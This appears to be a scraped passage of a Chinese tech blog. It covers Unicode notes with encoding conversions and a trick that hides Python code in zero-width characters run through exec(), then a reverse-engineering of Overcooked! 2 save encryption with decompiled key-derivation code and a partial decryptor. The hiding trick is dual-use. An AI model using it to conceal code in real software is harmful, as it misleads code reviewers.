̖̗̘̙̒̓̔̕̚ ̡̢̛̜̝̞̟̠̣ ̧̨̤̥̦̩̪̫̬ ̴̵̭̮̯̰̱̲̳ ̶̷̸̹̺̻̼̽̾ ͇̿̀́͂̓̈́͆ͅ ͈͉͍͎͊͋͌͏͐ ͓͔͕͖͙͑͒͗͘ ͚͛͜͟͢͝͞͠͡ ͣͤͥͦͧͨͩͪͫ ͬͭͮͯ\n这一坨是 Unicode 中的一些附加字符堆在一块的样子。附加字符在很多情境下都会被使用，例如：拼音。下面两组字符虽然看上去一样，但是对应的编码不一样。前者使用附加字符实现，后者是微软输入法特殊字符表中的打印字符。\nö：\\u006F\\u0308\nö：\\u00F6\n用 Python 就可以打印出附加字符。\n1string = \u0026#39; \u0026#39; 2 3for char in range(0x300, 0x310): 4 string = string + chr(char) 5 6print(string) 7 8 9# output: ̀́̂̃̄̅̆̇̈̉̊̋̌̍̎̏ 于是我们得到了一张鬼画符（？）\nUnicode 附加字符的优点正如你所看到的一样：更加灵活。\n代码混淆 Python 似乎是支持中文变量名的：\n1import dis as 蒂斯 2 3def 我再也不学Python了(): 4 苹果 = 10 5 香蕉 = 20 6 print(苹果 + 香蕉) 7 print(type(我再也不学Python了)) 8 9我再也不学Python了() 10 11蒂斯.dis(我再也不学Python了) 12 13\u0026#39;\u0026#39;\u0026#39; 14output: 15 1630 17\u0026lt;class \u0026#39;function\u0026#39;\u0026gt; 18 38 0 RESUME 0 19 20 39 2 LOAD_CONST 1 (10) 21 4 STORE_FAST 0 (苹果) 22 23 40 6 LOAD_CONST 2 (20) 24 8 STORE_FAST 1 (香蕉) 25 26 41 10 LOAD_GLOBAL 1 (NULL + print) 27 20 LOAD_FAST 0 (苹果) 28 22 LOAD_FAST 1 (香蕉) 29 24 BINARY_OP 0 (+) 30 28 CALL 1 31 36 POP_TOP 32 33 42 38 LOAD_GLOBAL 1 (NULL + print) 34 48 LOAD_GLOBAL 3 (NULL + type) 35 58 LOAD_GLOBAL 4 (我再也不学Python了) 36 68 CALL 1 37 76 CALL 1 38 84 POP_TOP 39 86 RETURN_CONST 0 (None) 40 41\u0026#39;\u0026#39;\u0026#39; 这种混淆算是较为一般的混淆，单纯修改变量名而不对运行逻辑进行修改，有些类似于“0O”混淆。但是这不禁让我想到，既然中文能够作为变量名，那么是不是大部分 Unicode 字符都可以当作变量名，甚至包括上文提到的零宽字符！\n实际上是不能的。但是零宽字符确实可以用于另一种形式的代码混淆，例如下面这段代码：\n1encoded = \u0026#34;‍‍‍‌‌‌‌​‍‍‍‌‌‍‌​‍‍‌‍‌‌‍​‍‍‌‍‍‍‌​‍‍‍‌‍‌‌​‍‌‍‌‌‌​‍‌‌‍‍‍​‍‌‌‍‌‌‌​‍‍‌‌‍‌‍​‍‍‌‍‍‌‌​‍‍‌‍‍‌‌​‍‍‌‍‍‍‍​‍‌‍‍‌‌​‍‌‌‌‌‌​‍‌‍‌‍‍‍​‍‍‌‍‍‍‍​‍‍‍‌‌‍‌​‍‍‌‍‍‌‌​‍‍‌‌‍‌‌​‍‌‌‌‌‍​‍‌‌‍‍‍​‍‌‍‌‌‍\u0026#34; 2exec(\u0026#34;\u0026#34;.join([chr(int(i.replace(\u0026#39;\\u200C\u0026#39;, \u0026#39;0\u0026#39;).replace(\u0026#39;\\u200D\u0026#39;, \u0026#39;1\u0026#39;), 2)) for i in encoded.split(\u0026#39;\\u200B\u0026#39;)])) 3 4# output: Hello, World! 我去，很神奇是不是！其原理也简单，使用零宽度字符隐写的方式将实际要执行的代码（在本案例中是 print(\u0026quot;Hello, World!)）编码，在执行的过程中再解码，有 SMC 那味。此案例中 encoded 生成的方式如下：\n1code = \u0026#34;\u0026#34;\u0026#34;print(\u0026#39;Hello, World!\u0026#39;)\u0026#34;\u0026#34;\u0026#34; 2encoded = \u0026#39;_\u0026#39; + \u0026#39;\\u200B\u0026#39;.join([bin(ord(i))[2:].replace(\u0026#39;0\u0026#39;,\u0026#39;\\u200C\u0026#39;).replace(\u0026#39;1\u0026#39;,\u0026#39;\\u200D\u0026#39;) for i in code]) + \u0026#39;_\u0026#39; 3print(encoded) 4 5# output: _‍‍‍‌‌‌‌​‍‍‍‌‌‍‌​‍‍‌‍‌‌‍​‍‍‌‍‍‍‌​‍‍‍‌‍‌‌​‍‌‍‌‌‌​‍‌‌‍‍‍​‍‌‌‍‌‌‌​‍‍‌‌‍‌‍​‍‍‌‍‍‌‌​‍‍‌‍‍‌‌​‍‍‌‍‍‍‍​‍‌‍‍‌‌​‍‌‌‌‌‌​‍‌‍‌‍‍‍​‍‍‌‍‍‍‍​‍‍‍‌‌‍‌​‍‍‌‍‍‌‌​‍‍‌‌‍‌‌​‍‌‌‌‌‍​‍‌‌‍‍‍​‍‌‍‌‌‍_ 6# 为了便于复制，我在编码的前后各加了一个下划线 UTF-7 UTF-7 编码并不是一种严格的 Unicode 编码。个人认为，这种编码实际上更加类似于 Base64 编码。UTF-7 的出现，是为了满足早期只能传输 7-bit 字符的 SMTP 标准，故现在 UTF-7 编码也正在逐渐被弃用。UTF-7 原理较为简单，下面是一个简单的 UTF-7 与 UTF-8 转化的例子。首先我们拿出待转化的 UTF-8 字符：\n绷\n然后打印出它的编码的二进制：\n1\u0026gt;\u0026gt;\u0026gt; bin(ord(\u0026#39;绷\u0026#39;))[2:].rjust(16, \u0026#39;0\u0026#39;) 2\u0026#39;0111111011110111\u0026#39; 然后像 Base64 编码那样将其六位一组切开，不够的位置补零。\n1\u0026gt;\u0026gt;\u0026gt; [\u0026#39;0111111011110111\u0026#39;.ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)] 2[\u0026#39;011111\u0026#39;, \u0026#39;101111\u0026#39;, \u0026#39;011100\u0026#39;] 随后查表。UTF-7 中使用的 Base64 编码表和标准 Base64 编码表有一些区别。UTF-7 使用的编码表并不使用 = 补齐。由此我们可以写出编码转化的最后一步了：\n1\u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [\u0026#39;011111\u0026#39;, \u0026#39;101111\u0026#39;, \u0026#39;011100\u0026#39;]]) 2\u0026#39;fvc\u0026#39; 于是我们得到了 绷 这个汉字的 UTF-7 编码：fvc。\n把上面的代码碎片合计一下，我们就能得到获取单个 UTF-8 字符的 UTF-7 编码的代码：\n1print(\u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [bin(ord(\u0026#39;绷\u0026#39;))[2:].rjust(16, \u0026#39;0\u0026#39;).ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)]])) 2 3# output: fvc UTF-7 编码有许多例外的情况：\n62 个数字与英语字母不需要转化；' ( ) , - . / : ? 这九种字符也无需转化。 + 被编码做 +-。 每一个区块以 + 为开头，- 为结尾。 1print(\u0026#34;+\u0026#34; + \u0026#34;-+\u0026#34;.join([\u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [bin(ord(k))[2:].rjust(16, \u0026#39;0\u0026#39;).ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)]]) for k in \u0026#34;绷不住了，笑えるwww\u0026#34;]) + \u0026#34;-\u0026#34;) 2 3# output: +fvc-+Tg0-+T08-+ToY-+/ww-+exE-+MEg-+MIs-+AHc-+AHc-+AHc- 上面这行代码能且只能标准地编码非 ASCII 编码字符的 UTF-8 编码字符，而不能对 ASCII 编码字符进行标准地编码，因为有近一半的 ASCII 字符的 UTF-7 编码与其 ASCII 编码一致——正如上文提到的那样。Cyberchef 里面带有 UTF-7 的编码和解码工具，并且那一解码工具能够对我这段非标准的编码进行解码。\n其实硬解也能解码，不是吗？\n既然编码代码都有了，那不妨把对应的解码代码造出来吧。还是要优雅地塞到一行里去：\n1print(\u0026#34;\u0026#34;.join([chr(int(int((bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[0]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[1]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[2]))[2:].rjust(6, \u0026#39;0\u0026#39;))[: -2], 2))) for i in \u0026#39;+fvc-+Tg0-+T08-+ToY-+/ww-+exE-+MEg-+MIs-+AHc-+AHc-+AHc-\u0026#39;[1:-1].split(\u0026#34;-+\u0026#34;)])) 2 3# output: 绷不住了，笑えるwww 实际上字符串位置是可以用 input() 的，我们不妨改成更易于在 Python Shell 里运行的代码：\n1\u0026gt;\u0026gt;\u0026gt; print(\u0026#34;+\u0026#34; + \u0026#34;-+\u0026#34;.join([\u0026#34;\u0026#34;.join([\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;[int(j, 2)] for j in [bin(ord(k))[2:].rjust(16, \u0026#39;0\u0026#39;).ljust(18, \u0026#39;0\u0026#39;)[i: i + 6] for i in range(0, 18, 6)]]) for k in input(\u0026#34;\u0026gt; \u0026#34;)]) + \u0026#34;-\u0026#34;) 2\u0026gt; 先帝创业未半而骈死于槽枥之间 3+UUg-+Xh0-+Uhs-+Tho-+Zyo-+U0o-+gAw-+mog-+a3s-+To4-+af0-+Z6U-+Tks-+lfQ- 4\u0026gt;\u0026gt;\u0026gt; print(\u0026#34;\u0026#34;.join([chr(int(int((bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[0]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[1]))[2:].rjust(6, \u0026#39;0\u0026#39;) + bin(\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39;.index(i[2]))[2:].rjust(6, \u0026#39;0\u0026#39;))[: -2], 2))) for i in input(\u0026#34;\u0026gt; \u0026#34;)[1:-1].split(\u0026#34;-+\u0026#34;)])) 5\u0026gt; +UUg-+Xh0-+Uhs-+Tho-+Zyo-+U0o-+gAw-+mog-+a3s-+To4-+af0-+Z6U-+Tks-+lfQ- 6先帝创业未半而骈死于槽枥之间 本段 UTF-7 相关代码纯手搓，Just for fun!\nUnicode 与 UTF-8、UTF-16、UTF-32 本来这一段应该是留给 UTF-16 的，但是学习了一些内容之后我感觉我对 UTF-8 也一点都不了解。遂把这些合并到一起去。\n这四者的关系，Unicode 是字符集，字符集中的每一个字符都有唯一的编号；后面四者为编码方式，用不同的方式表示出某一个字符。举一个例子：绷 这个字的 Unicode 编号是 U+7EF7，UTF-8 编码是 E7 BB B7，UTF-16LE 编码是 EB AF B7，UTF-32LE 编码是 F1 BB AF A7。\n下面这张表列出了你能见到 Unicode 编号以及编码的地方：\nUnicode 编号 UTF 编码 形如 U+XXXX 的 二进制文本查看器 各种编程语言中 \\uXXXX 或者 \\UXXXXXXXX 各种编程语言中打印 0xXXXX 对应的字符 Python 中使用 ord() 函数 所以说，本文前面的某些内容是不严谨的（我长期错把 Unicode 编号当作 UTF-8 编码） ㄟ( ▔, ▔ )ㄏ\nUnicode 与 UTF-8 Unicode 编号范围是 U+0000 到 U+10FFFF，占据字节大小为 1 到 3 个不等。下表展示了 Unicode 编号长度与 UTF-8 编码长度的关系：\nUnicode 编号范围 UTF-8 编码二进制格式 UTF-8 编码占据字节数 U+00 - U+7F 0XXXXXXX 1 U+80 - U+07FF 110XXXXX 10XXXXXX 2 U+0800 - U+FFFF 1110XXXX 10XXXXXX 10XXXXXX 3 U+010000 - U+10FFFF 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX 4 0 - 7F 的范围是 ASCII 编码的范围，这一部分 UTF-8 与 ASCII 编码是一致的。在后面的编码中，每个编码由多个字节组成，其中第一个字节前面由若干个连续的 1 和一个 0 开头，这用于告诉计算机，有多少个连续的 1，就说明字符从这一个字节开始，共占据了多少个字节。其后每一个字节都以 10 开头。中间的 X 则使用 Unicode 编号的二进制填充。\n例如 绷 这个字，其 Unicode 编号为 U+7EF7，在上表中显然位于第三行。我们先打印出其二进制：\n1\u0026gt;\u0026gt;\u0026gt; bin(ord(\u0026#39;绷\u0026#39;))[2:].rjust(16, \u0026#39;0\u0026#39;) 2‘0111111011110111’ 随后按照 4+6+6 的宽度将其切成三份：0111 111011 110111。\n然后手动填充格式，得到 UTF-8 编码的二进制：11100111 10111011 10110111\n1\u0026gt;\u0026gt;\u0026gt; hex(0b111001111011101110110111) 2\u0026#39;0xe7bbb7\u0026#39; 于是，我们得到了 绷 这个字的 UTF-8 编码：E7 BB B7\n需要注意的是，填充那一步需要从右向左填充，因而如果最高位是 0 就可以省略（不然你猜为什么 2 字节 UTF-8 编码中可填充的二进制位只有 11 个）。\nUnicode 与 UTF-16 与 UTF-8 一样，UTF-16 也是一种变长字节编码格式。不过 UTF-16 的编码方式更为简单粗暴:\n对于编号在 U+0000 到 U+FFFF 的字符，直接把编号当作编码，统一占两个字节 对于编号在 U+10000 到 U+10FFFF 的字符，先给它减去 0x10000，再填进 110110XX XXXXXXXX 110111XX XXXXXXXX 举个例子：兔\n如果你复制下来，你会发现它这个字占了四个字节，它的 Unicode 编号是 U+2F80E。我在“中日韩兼容表意文字区（CJK Compatibility Ideographs）”复制了这个字符，一些日语汉字会出现在这个区间。使用某些日语输入法打印出来的日语汉字的编码会与中文一样，这一区间用于存储日、韩、越语言中特有或者异形汉字。但是根据 NFKC 标准化，在网页上你是能够直接通过搜索“兔”找到这个字的。\n把它转换成 UTF-16，首先将其 Unicode 编号减去 0x10000：\n1\u0026gt;\u0026gt;\u0026gt; bin(ord(\u0026#39;兔\u0026#39;) - 0x10000)[2:].rjust(20, \u0026#39;0\u0026#39;) 2\u0026#39;00011111100000001111\u0026#39; 随后按照 2+8+2+8 的宽度将其切成四份：00 01111110 00 00001111。\n然后手动填充格式，得到 UTF-16 编码的二进制：11011000 01111110 11011100 00001111\n1\u0026gt;\u0026gt;\u0026gt; hex(0b11011000011111101101110000001111) 2\u0026#39;0xd87edc0f\u0026#39; 于是，我们得到了 兔 这个字的 UTF-16 编码：D8 7E DC 0F\nUTTF-16 编码是两个字节为一组读取，因此就要考虑字节序的问题。上面这一种为大端序，也就是 UTF-16BE，其小端序存储形式 UTF-16LE 为 7E D8 0F DC。为了区分大小端序，文件开头部分会有 FE FF（大端序）或 FF FE（小端序）的标注。而 UTF-8 编码中，计算机按顺序每次读取一个字节，因此不存在大小端序的问题。\n这时聪明的小朋友就要问了，计算机怎么知道这一个字符占了两个字节还是四个字节呢？这就不得不说 Unicode 的巧妙之处了。如果你仔细观察 Unicode 字符集，你会发现 U+D800 到 U+DBFF 被描述为\u0026quot;High Surrogate\u0026quot;（高代理项），U+DC00 到 U+DFFF 被描述为\u0026quot;Low Surrogate\u0026quot;（低代理项）。这两个区间内（连起来就是一个区间）并不存储字符，而这两个区间又分别是 110110XX XXXXXXXX 与 110111XX XXXXXXXX 的范围。因此，当计算机两字节一组读取到 D8 到 DB 中的某个值，就知道这个字符占据四个字节；读取到 DC 到 DF 中某个字节，就知道这两个字节要跟着前面两个字节一块解码。\nUnicode 与 UTF-32 UTF-32 是固定宽度编码，每一个编码占据 4 个字节，因此也许是最好理解的一种编码，直接由 Unicode 编号作为编码，因此 UTF-32 也有浪费存储空间的特点。\n","link":"https://jackgdn.github.io/post/unicode-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","section":"post","tags":["Python","Unicode","编码"],"title":"Unicode 学习记录"},{"body":"","link":"https://jackgdn.github.io/tags/%E7%BC%96%E7%A0%81/","section":"tags","tags":null,"title":"编码"},{"body":"这两天玩 Overcooked! 2 ，有的关卡因为没有攒够星星玩不了。我花钱买了游戏却不让我往后玩，那我自己改存档吧！\nOvercooked! 2 存档位于 C:\\Users\\{username}\\AppData\\LocalLow\\Team17\\Overcooked2\\{key}\\ 文件夹下。username 是自己的用户名；key 是 Steam 账号的 17 位 SteamID，我的账号的 key 是 76561198849752742。\n不难看出 Overcooked! 2 的存档都是以 .save 作为后缀。诸多游戏厂商都会把自家游戏存档存为 .save 格式。不过这并不是一种通用格式，不同厂商间存储的方式还不一样，有些使用文本文档或者 .json 格式明文存储（例如 Insurgency），有些使用序列化方式存储（例如 Arma3）。Overcooked! 2 的存储方式比较高级：\n它加密了……\nOvercooked! 2 是使用 Unity 引擎开发的游戏，这件事你一打开游戏就能知道。那我不妨把这游戏逆掉。\ndnSpy，启动！\n这样一款游戏，里边出现的类可以说是相当之多了。不过我只需要找到加密和解密存档的代码，因此我选择搜索 \u0026quot;save\u0026quot; 关键词来查找代码。不知道什么原因，开发人员没有使用 Unity 的 Mono Security 来保护代码，这也方便了我逆向。最终我在 GlobalSave 类里找到了极其可疑的代码：\n相关加密解密代码如下：\n1private byte[] Obfuscate(byte[] deobfuscatedText, int size, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 2{ 3\tif (deobfuscatedText == null || deobfuscatedText.Length == 0 || start + size \u0026gt; deobfuscatedText.Length) 4\t{ 5\treturn null; 6\t} 7\tbyte[] array = new byte[16]; 8\tSystem.Random random = new System.Random(); 9\trandom.NextBytes(array); 10\tbyte[] bytes = new PasswordDeriveBytes(this.GetUniqueId(), Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 11\tRijndaelManaged rijndaelManaged = new RijndaelManaged(); 12\trijndaelManaged.Mode = CipherMode.CBC; 13\tbyte[] array2 = null; 14\ttry 15\t{ 16\tusing (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(bytes, array)) 17\t{ 18\tusing (MemoryStream memoryStream = new MemoryStream()) 19\t{ 20\tusing (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write)) 21\t{ 22\tcryptoStream.Write(deobfuscatedText, start, size); 23\tcryptoStream.FlushFinalBlock(); 24\tarray2 = memoryStream.ToArray(); 25\tmemoryStream.Close(); 26\tcryptoStream.Close(); 27\t} 28\t} 29\t} 30\t} 31\tcatch (Exception ex) 32\t{ 33\tDebug.LogError(\u0026#34;GlobalSave Obfuscate exception=\u0026#34; + ex.ToString()); 34\treturn null; 35\t} 36\tfinally 37\t{ 38\trijndaelManaged.Clear(); 39\t} 40\tbyte[] array3 = new byte[16 + array2.Length]; 41\tArray.Copy(array, array3, 16); 42\tArray.Copy(array2, 0, array3, 16, array2.Length); 43\treturn array3; 44} 45// 加密部分 46 47private byte[] Deobfuscate(byte[] obfuscatedText, int size, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 48{ 49\tif (obfuscatedText == null || obfuscatedText.Length == 0 || obfuscatedText.Length \u0026lt;= start + size || obfuscatedText.Length \u0026lt;= 16) 50\t{ 51\treturn null; 52\t} 53\tbyte[] array = new byte[16]; 54\tArray.Copy(obfuscatedText, start, array, 0, 16); 55\tbyte[] array2 = new byte[size - 16 - start]; 56\tArray.Copy(obfuscatedText, 16, array2, 0, array2.Length); 57\tbyte[] bytes = new PasswordDeriveBytes(this.GetUniqueId(), Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 58\tRijndaelManaged rijndaelManaged = new RijndaelManaged(); 59\trijndaelManaged.Mode = CipherMode.CBC; 60\tbyte[] array3 = new byte[array2.Length]; 61\ttry 62\t{ 63\tusing (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(bytes, array)) 64\t{ 65\tusing (MemoryStream memoryStream = new MemoryStream(array2)) 66\t{ 67\tusing (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read)) 68\t{ 69\tcryptoStream.Read(array3, 0, array3.Length); 70\tmemoryStream.Close(); 71\tcryptoStream.Close(); 72\t} 73\t} 74\t} 75\t} 76\tcatch (Exception ex) 77\t{ 78\tDebug.LogError(\u0026#34;GlobalSave Deobfuscate exception=\u0026#34; + ex.ToString()); 79\treturn null; 80\t} 81\tfinally 82\t{ 83\trijndaelManaged.Clear(); 84\t} 85\treturn array3; 86} 87// 解密部分 88 89public byte[] ByteSave() 90{ 91\tstring text = this.ConvertDataToSave(); 92\tif (string.IsNullOrEmpty(text)) 93\t{ 94\treturn null; 95\t} 96\tbyte[] bytes = Encoding.UTF8.GetBytes(text); 97\tbyte[] array = this.Obfuscate(bytes, bytes.Length, 0, \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, \u0026#34;SHA1\u0026#34;, 256); 98\tif (array == null) 99\t{ 100\treturn null; 101\t} 102\tbyte[] bytes2 = BitConverter.GetBytes(CRC32.Calculate(array)); 103\tbyte[] array2 = new byte[array.Length + bytes2.Length]; 104\tArray.Copy(array, array2, array.Length); 105\tArray.Copy(bytes2, 0, array2, array.Length, bytes2.Length); 106\treturn array2; 107} 108// 存储时进行校验 109 110public bool ByteLoad(byte[] _data) 111{ 112\tif (_data == null || (long)_data.Length \u0026lt;= 4L) 113\t{ 114\treturn false; 115\t} 116\tint size = _data.Length - 4; 117\tif (!CRC32.Validate(_data, (uint)size)) 118\t{ 119\treturn false; 120\t} 121\tbyte[] array = this.Deobfuscate(_data, size, 0, \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, \u0026#34;SHA1\u0026#34;, 256); 122\tif (array == null) 123\t{ 124\treturn false; 125\t} 126\tstring @string = Encoding.UTF8.GetString(array); 127\treturn this.ConvertDataFromSave(@string); 128} 129// 读取时进行校验 对于加密函数，经过分析我得到，程序会使用我一开始提到的 key 与密码盐 \u0026quot;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026quot; 使用 PasswordDeriveBytes() 类共同生成密钥，并且随机生成长度为 16 字节的初始化向量 IV。其中，在生成密钥时，程序采用 PBKDF1 算法与 SHA1 算法对密码迭代两次。随后程序依据已知数据，使用 CBC 模式对明文进行 AES 加密（Rijndael 算法）。由于初始化向量是随机生成的，程序将 CRC32 校验码以及初始化向量的 16 个字节写在了存档文件的最前端，方便解密时读取。后面写入被加密的存档文件。此外根据反编译出的 LitJson 命名空间推测明文存档是以 .json 格式读取的。\n程序解读毕。将上述代码复制粘贴后略加修改，即可得到用于加密解密存档的脚本了。修改过的脚本如下：\n1using System; 2using System.Diagnostics; 3using System.IO; 4using System.Net.Security; 5using System.Security.Cryptography; 6using System.Text; 7 8namespace overcooked2 9{ 10 public class CRC32 11 { 12 public const uint c_HashSize = 4u; 13 14 private const uint poly = 1491524015u; 15 16 private const uint seed = 3605721660u; 17 18 private static uint[] s_table; 19 20 private CRC32() 21 { 22 if (s_table == null) 23 { 24 MakeTable(); 25 } 26 } 27 28 protected void MakeTable() 29 { 30 s_table = new uint[256]; 31 for (uint num = 0u; num \u0026lt; 256; num++) 32 { 33 uint num2 = num; 34 for (uint num3 = 0u; num3 \u0026lt; 8; num3++) 35 { 36 num2 = (((num2 \u0026amp; 1) != 1) ? (num2 \u0026gt;\u0026gt; 1) : (num2 ^ 0x58E6D9AF)); 37 } 38 s_table[num] = num2; 39 } 40 } 41 42 public uint CalculateHash(byte[] _data, uint _start, uint _size) 43 { 44 uint num = 3605721660u; 45 for (uint num2 = _start; num2 \u0026lt; _start + _size; num2++) 46 { 47 num = ((num \u0026gt;\u0026gt; 8) ^ s_table[_data[num2] ^ (num \u0026amp; 0xFF)]); 48 } 49 return num; 50 } 51 52 public static void Append(ref byte[] _buffer) 53 { 54 new CRC32().AppendHash(ref _buffer); 55 } 56 57 public void AppendHash(ref byte[] _buffer) 58 { 59 AppendHash(ref _buffer, 0u, (uint)_buffer.Length); 60 } 61 62 public void AppendHash(ref byte[] _buffer, uint _start, uint _size) 63 { 64 AppendHash(ref _buffer, 0u, _size, CalculateHash(_buffer, _start, _size)); 65 } 66 67 public void AppendHash(ref byte[] _buffer, uint _start, uint _size, uint _hash) 68 { 69 byte[] bytes = BitConverter.GetBytes(_hash); 70 if (_buffer.Length \u0026lt; (int)(_start + _size + 4)) 71 { 72 byte[] new_buffer = new byte[_start + _size + 4]; 73 Array.Copy(_buffer, new_buffer, _buffer.Length); 74 _buffer = new_buffer; 75 } 76 int num2 = (int)_size; 77 for (int i = 0; i \u0026lt; bytes.Length; i++) 78 { 79 _buffer[i + num2] = bytes[i]; 80 } 81 } 82 } 83 84 class OC2 85 { 86 private static byte[] Deobfuscate(byte[] obfuscatedText, int size, string key, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 87 { 88 if (obfuscatedText == null || obfuscatedText.Length == 0 || obfuscatedText.Length \u0026lt;= start + size || obfuscatedText.Length \u0026lt;= 16) 89 { 90 return null; 91 } 92 byte[] array = new byte[16]; 93 Array.Copy(obfuscatedText, start, array, 0, 16); 94 byte[] array2 = new byte[size - 16 - start]; 95 Array.Copy(obfuscatedText, 16, array2, 0, array2.Length); 96 byte[] bytes = new PasswordDeriveBytes(key, Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 97 RijndaelManaged rijndaelManaged = new RijndaelManaged(); 98 rijndaelManaged.Mode = CipherMode.CBC; 99 byte[] array3 = new byte[array2.Length]; 100 try 101 { 102 using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor(bytes, array)) 103 { 104 using (MemoryStream memoryStream = new MemoryStream(array2)) 105 { 106 using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read)) 107 { 108 cryptoStream.Read(array3, 0, array3.Length); 109 memoryStream.Close(); 110 cryptoStream.Close(); 111 } 112 } 113 } 114 } 115 catch (Exception ex) 116 { 117 return null; 118 } 119 finally 120 { 121 rijndaelManaged.Clear(); 122 } 123 return array3; 124 } 125 126 private static byte[] Obfuscate(byte[] deobfuscatedText, int size, string key, int start = 0, string salt = \u0026#34;jjo+Ffqil5bdpo5VG82kLj8Ng1sK7L/rCqFTa39Zkom2/baqf5j9HMmsuCr0ipjYsPrsaNIOESWy7bDDGYWx1eA==\u0026#34;, string hashFunction = \u0026#34;SHA1\u0026#34;, int keySize = 256) 127 { 128 if (deobfuscatedText == null || deobfuscatedText.Length == 0 || start + size \u0026gt; deobfuscatedText.Length) 129 { 130 return null; 131 } 132 byte[] array = new byte[16]; 133 System.Random random = new System.Random(); 134 random.NextBytes(array); 135 byte[] bytes = new PasswordDeriveBytes(key, Encoding.ASCII.GetBytes(salt), hashFunction, 2).GetBytes(keySize / 8); 136 RijndaelManaged rijndaelManaged = new RijndaelManaged(); 137 rijndaelManaged.Mode = CipherMode.CBC; 138 byte[] array2 = null; 139 try 140 { 141 using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor(bytes, array)) 142 { 143 using (MemoryStream memoryStream = new MemoryStream()) 144 { 145 using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write)) 146 { 147 cryptoStream.Write(deobfuscatedText, start, size); 148 cryptoStream.FlushFinalBlock(); 149 array2 = memoryStream.ToArray(); 150 memoryStream.Close(); 151 cryptoStream.Close(); 152 } 153 } 154 } 155 } 156 catch (Exception ex) 157 { 158 return null; 159 } 160 finally 161 { 162 rijndaelManaged.Clear(); 163 } 164 byte[] array3 = new byte[16 + array2.Length]; 165 Array.Copy(array, array3, 16); 166 Array.Copy(array2, 0, array3, 16, array2.Length); 167 return array3; 168 } 169 170 static void Main(string[] args) 171 { 172 string inputfile = args[0]; 173 string steamid = args[1]; 174 byte[] init_data = File.ReadAllBytes(inputfile); 175 if (Path.GetExtension(inputfile) == \u0026#34;.save\u0026#34;) 176 { 177 byte[] final_data = Deobfuscate(init_data, init_data.Length - 4, steamid); 178 string outputfile = Path.ChangeExtension(inputfile, \u0026#34;.json\u0026#34;); 179 File.WriteAllBytes(outputfile, final_data); 180 } 181 else if (Path.GetExtension(inputfile) == \u0026#34;.json\u0026#34;) 182 { 183 byte[] final_data = Obfuscate(init_data, init_data.Length, steamid); 184 string outputfile = Path.ChangeExtension(inputfile, \u0026#34;.save\u0026#34;); 185 